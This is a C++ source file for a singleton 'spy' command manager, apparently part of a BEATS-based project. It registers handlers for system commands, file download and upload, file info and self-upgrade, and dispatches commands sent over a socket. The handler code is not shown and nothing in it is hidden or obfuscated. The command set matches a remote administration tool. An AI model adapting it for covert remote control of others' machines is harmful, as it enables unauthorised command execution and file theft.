#include "stdafx.h"
#include "SpyCommandManager.h"
#include "SpyManager.h"
#include "SpyCommandMessageBox.h"
#include "SpyCommandVersion.h"
#include "SpyCommandSysCMD.h"
#include "SpyCommandDownloadFile.h"
#include "SpyCommandUploadFile.h"
#include "SpyCommandGetFileInfo.h"
#include "SpyCommandUpgrade.h"

CSpyCommandManager* CSpyCommandManager::m_pInstance = NULL;

CSpyCommandManager::CSpyCommandManager()
{
}

CSpyCommandManager::~CSpyCommandManager()
{

}

bool CSpyCommandManager::Initialize()
{
    RegisterCommand(new CSpyCommandMessageBox);
    RegisterCommand(new CSpyCommandVersion);
    RegisterCommand(new CSpyCommandSysCMD);
    RegisterCommand(new CSpyCommandDownloadFile);
    RegisterCommand(new CSpyCommandUploadFile);
    RegisterCommand(new CSpyCommandGetFileInfo);
    RegisterCommand(new CSpyCommandUpgrade);

    return true;
}

bool CSpyCommandManager::Uninitialize()
{
    for (std::map<ESpyCommandType, CSpyCommandBase*>::iterator iter = m_commandMap.begin(); iter != m_commandMap.end(); ++iter)
    {
        BEATS_SAFE_DELETE(iter->second);
    }
    m_commandMap.clear();
    return true;
}

bool CSpyCommandManager::RegisterCommand( CSpyCommandBase* pCommand )
{
    ESpyCommandType type = pCommand->GetType();
    std::map<ESpyCommandType, CSpyCommandBase*>::iterator iter = m_commandMap.find(type);
    bool bRet = iter == m_commandMap.end();
    BEATS_ASSERT(bRet, _T("Register spy command failed, the command %d already exists!"), type);
    if (bRet)
    {
        m_commandMap[type] = pCommand;
    }
    return bRet;
}

bool CSpyCommandManager::SendCommand( SharePtr<SSocketContext>& pSocketContext, CSpyCommandBase* pCommand )
{
    bool bRet = pCommand != NULL;
    BEATS_ASSERT(bRet, _T("Send spy command failed, Can't Send NULL command!"));
    if (bRet && !pSocketContext->GetBitFlag(eSCFB_Invalid))
    {
        EnterCriticalSection(&pSocketContext->m_sendSection);
        size_t uWritePos = pSocketContext->m_pSendBuffer->GetWritePos();
        *pSocketContext->m_pSendBuffer << eSMT_Command;
        *pSocketContext->m_pSendBuffer << 0;
        *pSocketContext->m_pSendBuffer << pCommand->GetType();
        pCommand->Deserialize(*pSocketContext->m_pSendBuffer);
        size_t msgSize = pSocketContext->m_pSendBuffer->GetWritePos() - uWritePos;
        pSocketContext->m_pSendBuffer->RewriteData(uWritePos + 4, &msgSize, sizeof(msgSize));
        pSocketContext->SetBitFlag(eSCFB_CanSend, true);
        LeaveCriticalSection(&pSocketContext->m_sendSection);
    }
    return bRet;
}

bool CSpyCommandManager::ExecuteCommand( SharePtr<SSocketContext>& pSocketContext, CSerializer& serializer )
{
    ESpyCommandType commandType;
    serializer >> commandType;
    std::map<ESpyCommandType, CSpyCommandBase*>::iterator iter = m_commandMap.find(commandType);
    bool bRet = iter != m_commandMap.end();
    BEATS_ASSERT(bRet, _T("Can't execute command, type %d"), commandType);
    if (bRet && !pSocketContext->GetBitFlag(eSCFB_Invalid))
    {
        iter->second->Serialize(serializer);
        iter->second->Execute(pSocketContext);
    }
    return bRet;
}